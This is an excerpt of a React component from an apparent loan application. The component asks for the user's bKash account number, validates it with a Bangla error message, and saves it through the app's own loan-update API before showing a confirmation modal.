...
export default function VerifyNumber() {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    if (!validate(mobileNumber)) {
      setError('অনুগ্রহ করে আপনার সঠিক বিকাশ নম্বর লিখুন');
      return;
    }

    updateLoanData({ mobile_number: mobileNumber, status: 'mobile_verified' });
    ...
    try {
      await fetch('/api/loan/update', {
        ...
        body: JSON.stringify({ id: loanData.id, mobile_number: mobileNumber, status: 'mobile_verified' })
      });
    } catch (err) {
      ...
      <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
        ...
        <form onSubmit={handleSubmit}>
          ...
          <div className="bg-pink-600 px-6 py-16">
            <p className="text-white text-sm mb-2 text-center">Your bKash Account Number</p>
            <input
              type="tel"
              value={mobileNumber}
          ...
          <div className="flex justify-between items-center bg-white px-6 py-4">
            ...
            <button 
              type="submit" 
              disabled={!isValid}
              className={`w-[48%] py-2 rounded transition-colors ${isValid ? 'bg-pink-500 text-white hover:bg-pink-600' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}
            >
              Confirm
            </button>
          </div>
        ...
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-pink-500 rounded-lg p-6 max-w-sm w-full mx-4 text-center">
            ...
            <div className="flex gap-4">
              <button onClick={() => router.back()} className="flex-1 bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
                Yes
              </button>
